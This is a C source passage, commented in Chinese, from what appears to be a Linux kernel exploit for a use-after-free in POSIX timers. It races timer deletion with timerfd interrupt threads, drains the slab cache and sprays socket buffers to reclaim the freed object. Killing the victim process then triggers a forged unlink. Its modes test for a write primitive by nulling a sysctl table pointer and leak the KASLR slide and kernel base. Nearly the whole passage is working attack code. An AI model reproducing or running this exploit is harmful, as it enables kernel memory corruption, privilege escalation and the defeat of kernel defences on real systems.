		int irq_fd[16];
		pthread_t irq_th[16];
		struct pokestate ps[16];
		atomic_int irq_ready;
		int n_irq = 0;

		atomic_store(&irq_ready, 0);
		if (POKE) {
			for (i = 0; i < n_del_cpus && i < 16; i++) {
				int fd = timerfd_create(CLOCK_MONOTONIC, 0);

				if (fd < 0)
					break;
				ps[n_irq].fd = fd;
				ps[n_irq].cpu = del_cpus[i];
				ps[n_irq].spin_ns = POKE_SPIN_NS;
				ps[n_irq].stop = &sh->stop;
				ps[n_irq].ready = &irq_ready;
				irq_fd[n_irq] = fd;
				if (pthread_create(&irq_th[n_irq], 0, poker_thread, &ps[n_irq])) {
					close(fd);
					break;
				}
				n_irq++;
			}
			while (atomic_load(&irq_ready) != n_irq)
				cpu_relax();
		}
		atomic_store(&d.irq_arm_go, 1);
		atomic_store(&sh->delete_go, 1);
		t_go = nsec();
		if (n_irq) {
			struct itimerspec it;
			struct timespec now;

			memset(&it, 0, sizeof it);
			clock_gettime(CLOCK_MONOTONIC, &now);
			it.it_value.tv_sec = now.tv_sec;
			it.it_value.tv_nsec = now.tv_nsec + 1000;
			if (it.it_value.tv_nsec >= 1000000000L) {
				it.it_value.tv_nsec -= 1000000000L;
				it.it_value.tv_sec++;
			}
			it.it_interval.tv_sec = IRQ_PERIOD_NS / 1000000000L;
			it.it_interval.tv_nsec = IRQ_PERIOD_NS % 1000000000L;
			for (i = 0; i < n_irq; i++) {
				pin(ps[i].cpu);      /* hrtimer 在调用者 CPU 上排队 */
				timerfd_settime(irq_fd[i], TFD_TIMER_ABSTIME, &it, NULL);
			}
		}
		for (i = 0; i < WORKERS; i++)
			if (th[i])
				pthread_join(th[i], 0);
		t_end = nsec();
		/* 收 poker：它们阻塞在 read() 上，必须再给一次到期才会返回 */
		atomic_store(&sh->stop, 1);
		for (i = 0; i < n_irq; i++) {
			struct itimerspec z;

			memset(&z, 0, sizeof z);
			z.it_value.tv_nsec = 1000;
			pin(ps[i].cpu);
			timerfd_settime(irq_fd[i], 0, &z, NULL);
		}
		for (i = 0; i < n_irq; i++) {
			pthread_join(irq_th[i], 0);
			close(irq_fd[i]);
		}
	}
	tt2 = t_end;
	storm_us = (t_end - t_go) / 1000;
	{
		long long ex = atomic_load(&sh->exec_ns);

		if (ex)
			exec_at_us = (ex - t_go) / 1000;
	}
	deleted = atomic_load(&sh->deleted);

	/* exec 批完成时刻（上游硬约束：必须早于风暴结束 = delete_done_ns） */
	{
		long long dl = nsec() + 300000000LL;

		while (nsec() < dl) {
			if (access(ACK_PATH, F_OK) == 0) {
				ack_ns = nsec();
				break;
			}
			usleep(300);
		}
	}
	exec_batch_us = ack_ns ? (ack_ns - t_go) / 1000 : -1;
	mark = (access(MARK_PATH, F_OK) == 0);
	ack = (access(ACK_PATH, F_OK) == 0);
	unlink(ACK_PATH);
	unlink(MARK_PATH);

	/* ★ 强制 RCU + 等 posix_timers_cache 排空：对象真正归还是回收的前提 */
	if (RCU_TIMERS > 0)
		force_rcu(RCU_TIMERS);
	if (RCU_WAIT_MS > 0)
		usleep((useconds_t)RCU_WAIT_MS * 1000);
	if (wait_drain(base_t, t1, seq)) {
		kill(v, SIGKILL);
		waitpid(v, 0, 0);
		munmap(sh, sizeof *sh);
		free(ids);
		return 0;
	}

	tt3 = nsec();
	/* ★ 填充：此刻 timer 页是"最近释放"，LIFO 下最可能被我们的分配接手 */
	sent = spray_fill(frag);
	tt4 = nsec();

	/* ★ 触发摘除：victim 整组退出 ⇒ cleanup_timerqueue() 遍历队列，unlink 悬空节点 */
	kill(v, SIGKILL);
	waitpid(v, 0, 0);
	tt5 = nsec();

	if (detect) {
		long hits = scan_head_zeroed();

		if (hits) {
			g_run_hits += hits;
			printf("DETECT_HIT attempt=%d sockets=%ld via_ptr=%ld via_zero=%ld"
			       " created=%d deleted=%d mark=%d ack=%d sent=%ld\n",
			       seq, hits, g_hit_ptr, g_hit_zero,
			       n, deleted, mark, ack, sent);
			hit = 1;
		} else if (VERBOSE)
			printf("  attempt=%d created=%d deleted=%d mark=%d ack=%d sent=%ld storm_us=%lld exec_at_us=%lld batch_us=%lld (no hit)\n",
			       seq, n, deleted, mark, ack, sent, storm_us, exec_at_us, exec_batch_us);
		spray_drain();
	} else {
		uint64_t q0 = 0, q1 = 0;
		char raw[64] = { 0 };
		int ok = (read_bootid(&q0, &q1, raw, sizeof raw) == 0);

		if (probe) {
			/* data == NULL ⇒ proc_do_uuid 每次生成新 UUID ⇒ boot_id 每次都变 */
			if (ok && (q0 != base_q0 || q1 != base_q1)) {
				printf("PROBE_HIT attempt=%d bootid=%s base=%s\n",
				       seq, raw, base_raw);
				printf("  ⇒ random_table[4].data 已成 NULL：伪造 unlink 执行成功\n");
				printf("  ⇒ 悬空节点存在 + 回收落上 + 写原语可用（本步无任何破坏性副作用）\n");
				printf("  created=%d deleted=%d mark=%d ack=%d sent=%ld storm_us=%lld exec_at_us=%lld\n",
				       n, deleted, mark, ack, sent, storm_us, exec_at_us);
				hit = 1;
			} else if (VERBOSE)
				printf("  attempt=%d created=%d deleted=%d mark=%d ack=%d sent=%ld storm_us=%lld exec_at_us=%lld batch_us=%lld (no hit)\n",
				       seq, n, deleted, mark, ack, sent, storm_us, exec_at_us, exec_batch_us);
		} else if (ok && q0 == FORGED_PARENT) {
			uint64_t slide = q1 - LINK_CYCLE_ADDR;

			printf("STAGE0_PASS attempt=%d q0=%#llx q1=%#llx slide=%#llx kernel_base=%#llx\n",
			       seq, (unsigned long long)q0, (unsigned long long)q1,
			       (unsigned long long)slide,
			       (unsigned long long)(0xffffffc008000000ULL + slide));
			hit = 1;
		} else if (VERBOSE)
			printf("  attempt=%d created=%d deleted=%d mark=%d ack=%d sent=%ld storm_us=%lld exec_at_us=%lld bootid=%s (no hit)\n",
			       seq, n, deleted, mark, ack, sent, storm_us, exec_at_us, raw);
		spray_drain();
	}
	tt6 = nsec();
	if (VERBOSE)
		printf("  timing(ms) create=%.1f storm=%.1f drain=%.1f fill=%.1f kill=%.1f check=%.1f"
		       " | PRE_DRAIN+slab=%.1f total=%.1f\n",
		       (tt1 - tt0) / 1e6, (tt2 - tt1) / 1e6, (tt3 - tt2) / 1e6,
		       (tt4 - tt3) / 1e6, (tt5 - tt4) / 1e6, (tt6 - tt5) / 1e6,
		       (tt1 - tt0) / 1e6, (tt6 - tt0) / 1e6);
	munmap(sh, sizeof *sh);
	free(ids);
	return hit;
}

/* ---------------- main ---------------- */
static void env_int(const char *k, int *v)
{
	const char *e = getenv(k);

	if (e)
		*v = atoi(e);
}

static void env_long(const char *k, long *v)
{
	const char *e = getenv(k);

	if (e)
		*v = atol(e);
}

static void env_cpus(const char *spec)
{
	int k = 0;
	const char *p = spec;

	while (*p && k < 16) {
		while (*p == ',' || *p == ' ')
			p++;
		if (!*p)
			break;
		del_cpus[k++] = atoi(p);
		while (*p && *p != ',')
			p++;
	}
	if (k)
		n_del_cpus = k;
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "stage0";
	if (!strcmp(mode, "vexec")) {
		vexec_main();       /* 不返回 */
		return 0;
	}
	const char *e;
	unsigned char *frag;
	int detect = !strcmp(mode, "detect");
	int probe = !strcmp(mode, "probe");
	int i;
	long long t0;

	env_int("S0_KS", &KS);
	env_int("S0_WORKERS", &WORKERS);
	env_int("S0_EXEC_AFTER", &EXEC_AFTER);
	env_int("S0_SOCKS", &SOCKS);
	env_int("S0_MSGS", &MSGS);
	env_int("S0_SEND", &SEND_BYTES);
	env_int("S0_RCU", &RCU_TIMERS);
	env_int("S0_RCU_WAIT_MS", &RCU_WAIT_MS);
	env_int("S0_DRAIN_MS", &DRAIN_MS);
	env_int("S0_DRAIN_SLACK", &DRAIN_SLACK);
	env_int("S0_ATTEMPTS", &ATTEMPTS);
	env_int("S0_VERBOSE", &VERBOSE);
	env_int("S0_IRQ_FDS", &IRQ_FDS);
	env_int("S0_POKE", &POKE);
	env_long("S0_POKE_SPIN_NS", &POKE_SPIN_NS);
	env_int("S0_PRE_DRAIN", &PRE_DRAIN);
	env_long("S0_IRQ_PERIOD_NS", &IRQ_PERIOD_NS);
	env_long("S0_IRQ_LEAD_NS", &IRQ_LEAD_NS);
	env_long("S0_IRQ_LEAD_SWEEP_NS", &IRQ_LEAD_SWEEP_NS);
	env_int("S0_IRQ_LEAD_STEPS", &IRQ_LEAD_STEPS);
	env_int("S0_EXEC_REPEATS", &EXEC_REPEATS);
	env_long("S0_JITTER_NS", &JITTER_NS);
	if ((e = getenv("S0_EXEC_CPU")))
		exec_cpu = atoi(e);
	if ((e = getenv("S0_DEL_CPUS")))
		env_cpus(e);

	if (!strcmp(mode, "list")) {
		long a, t;

		if (slab_read("posix_timers_cache", &a, &t))
			printf("<unreadable>\n");
		else
			printf("posix_timers_cache active=%ld total=%ld\n", a, t);
		return 0;
	}
	if (!strcmp(mode, "affinity")) {
		for (i = 0; i < 8; i++) {
			cpu_set_t want, got;
			int r, r2;

			CPU_ZERO(&want);
			CPU_SET(i, &want);
			r = sched_setaffinity(0, sizeof want, &want);
			CPU_ZERO(&got);
			r2 = sched_getaffinity(0, sizeof got, &got);
			printf("cpu %d set=%d(errno=%d) readback=%d\n", i, r, errno,
			       (r2 == 0) ? !!CPU_ISSET(i, &got) : -1);
		}
		return 0;
	}
	if (!strcmp(mode, "baseline")) {
		uint64_t q0 = 0, q1 = 0;
		char raw[64] = { 0 };
		int ok = read_bootid(&q0, &q1, raw, sizeof raw);

		printf("baseline ok=%d raw=%s q0=%#llx q1=%#llx\n", ok, raw,
		       (unsigned long long)q0, (unsigned long long)q1);
		return 0;
	}

	choose_cpus();
	printf("stage0 v3 mode=%s KS=%d workers=%d exec_after=%d exec_cpu=%d parent_cpu=%d del=[",
	       mode, KS, WORKERS, EXEC_AFTER, exec_cpu, parent_cpu);
	for (i = 0; i < n_del_cpus; i++)
		printf("%d%s", del_cpus[i], i + 1 < n_del_cpus ? "," : "");
	printf("] socks=%d msgs=%d send=%#x rcu=%d drain_ms=%d attempts=%d\n",
	       SOCKS, MSGS, SEND_BYTES, RCU_TIMERS, DRAIN_MS, ATTEMPTS);
	printf("   irq: fds=%d period=%ldns lead=%ldns sweep=%ld x%d\n",
	       IRQ_FDS, IRQ_PERIOD_NS, IRQ_LEAD_NS, IRQ_LEAD_SWEEP_NS, IRQ_LEAD_STEPS);
	fflush(stdout);

	frag = malloc((size_t)SEND_BYTES);
	if (!frag) {
		printf("frag alloc fail\n");
		return 1;
	}
		if (detect) {
			/* 8KB 不再是 264 的整数倍 —— 判据本身已改为相位无关，无需此闸门 */
			(void)0;
		build_fragment_safe(frag, (size_t)SEND_BYTES);
		printf("detect 模式：安全片段（rb 指针全 0）—— 命中判据 = 回读流里出现连续零字节\n");
	}
	else if (probe)
		build_fragment_probe(frag, (size_t)SEND_BYTES);
	else
		build_fragment(frag, (size_t)SEND_BYTES);
	if (spray_setup()) {
		printf("spray_setup fail errno=%d\n", errno);
		return 1;
	}

	/* 基线 boot_id（正常情况下整个 boot 内恒定） */
	if (!detect) {
		if (read_bootid(&base_q0, &base_q1, base_raw, sizeof base_raw))
			printf("警告: 读 baseline boot_id 失败\n");
		else
			printf("baseline boot_id=%s  forged_parent=%#llx\n",
			       base_raw, (unsigned long long)FORGED_PARENT);
	}

	t0 = nsec();
	for (i = 1; i <= ATTEMPTS; i++) {
		if (round_do(i, frag, detect, probe))
			break;
		if (!(i % 20))
			printf("[progress] %d/%d attempts, %.1fs, drain_last=%ldms\n",
			       i, ATTEMPTS, (double)(nsec() - t0) / 1e9, g_drain_ms);
		fflush(stdout);
	}
	printf("done: %d attempts in %.1fs  hits=%ld (ptr=%ld zero=%ld)\n", ATTEMPTS,
	       (double)(nsec() - t0) / 1e9, g_run_hits, g_hit_ptr, g_hit_zero);
	spray_close();
	free(frag);
	return 0;
}
